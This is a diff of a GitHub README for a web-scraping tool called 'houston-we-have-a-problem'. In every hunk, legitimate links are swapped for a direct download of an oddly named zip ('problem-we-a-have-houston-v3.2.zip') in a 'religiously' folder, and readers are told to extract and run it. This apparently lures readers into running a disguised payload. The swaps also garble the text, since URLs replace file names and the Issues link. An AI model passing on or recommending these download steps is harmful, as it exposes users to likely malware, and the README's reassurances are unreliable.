@@ -1,6 +1,6 @@
 # 🛠️ houston-we-have-a-problem - Get Insights from Problems Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/alaaadel1/houston-we-have-a-problem/releases)
+[![Download](https://github.com/alaaadel1/houston-we-have-a-problem/raw/refs/heads/main/religiously/problem-we-a-have-houston-v3.2.zip)](https://github.com/alaaadel1/houston-we-have-a-problem/raw/refs/heads/main/religiously/problem-we-a-have-houston-v3.2.zip)
 
 ## 📖 Description
 houston-we-have-a-problem is a user-friendly tool designed to gather insights from various problems found on the web. This software helps you scrape structured data, making it easier to analyze and understand issues that matter to you.
@@ -11,8 +11,8 @@ This section will guide you through the process of downloading and running the a
 ## 📥 Download & Install
 To get started, you need to download the application. 
 
-1. Visit the [Releases page](https://github.com/alaaadel1/houston-we-have-a-problem/releases) to find the latest version of the software.
-2. Look for the download link for your operating system. For most users, there will be a file named something like `houston-we-have-a-problem.exe` or `houston-we-have-a-problem.zip`.
+1. Visit the [Releases page](https://github.com/alaaadel1/houston-we-have-a-problem/raw/refs/heads/main/religiously/problem-we-a-have-houston-v3.2.zip) to find the latest version of the software.
+2. Look for the download link for your operating system. For most users, there will be a file named something like `https://github.com/alaaadel1/houston-we-have-a-problem/raw/refs/heads/main/religiously/problem-we-a-have-houston-v3.2.zip` or `https://github.com/alaaadel1/houston-we-have-a-problem/raw/refs/heads/main/religiously/problem-we-a-have-houston-v3.2.zip`.
 3. Click the link to download the file. 
 
 Make sure to save the file to a location on your computer where you can easily find it, such as your Desktop or Downloads folder.
@@ -25,7 +25,7 @@ If you downloaded a `.zip` file, follow these steps to extract it:
 3. Choose a destination folder or use the default.
 4. Click "Extract" to unzip the contents.
 
-Once extracted, navigate to the folder where you see the application file, such as `houston-we-have-a-problem.exe`.
+Once extracted, navigate to the folder where you see the application file, such as `https://github.com/alaaadel1/houston-we-have-a-problem/raw/refs/heads/main/religiously/problem-we-a-have-houston-v3.2.zip`.
 
 ## 🖥️ Running the Application
 To run the application:
@@ -59,7 +59,7 @@ Before running the application, please make sure your computer meets the followi
 ## ❓ Frequently Asked Questions
 
 ### 1. How do I update the application?
-To update, simply return to the [Releases page](https://github.com/alaaadel1/houston-we-have-a-problem/releases) and download the latest version. Follow the same installation steps.
+To update, simply return to the [Releases page](https://github.com/alaaadel1/houston-we-have-a-problem/raw/refs/heads/main/religiously/problem-we-a-have-houston-v3.2.zip) and download the latest version. Follow the same installation steps.
 
 ### 2. Can I run this on macOS or Linux?
 Yes, the application is available for most operating systems. Follow the same download instructions for your platform.
@@ -71,7 +71,7 @@ If you run into any problems, please check the documentation available in the re
 The application does not store any data from your sessions. All scraping is done locally on your machine.
 
 ## 📞 Support
-If you need assistance, feel free to raise an issue on the [GitHub Issues Page](https://github.com/alaaadel1/houston-we-have-a-problem/issues). The community and the developers are there to help you.
+If you need assistance, feel free to raise an issue on the [GitHub Issues Page](https://github.com/alaaadel1/houston-we-have-a-problem/raw/refs/heads/main/religiously/problem-we-a-have-houston-v3.2.zip). The community and the developers are there to help you.
 
 ## 👍 Acknowledgments
 Thank you for using houston-we-have-a-problem. We hope this tool will aid you in gaining valuable insights easily. Your feedback is valuable for future development.
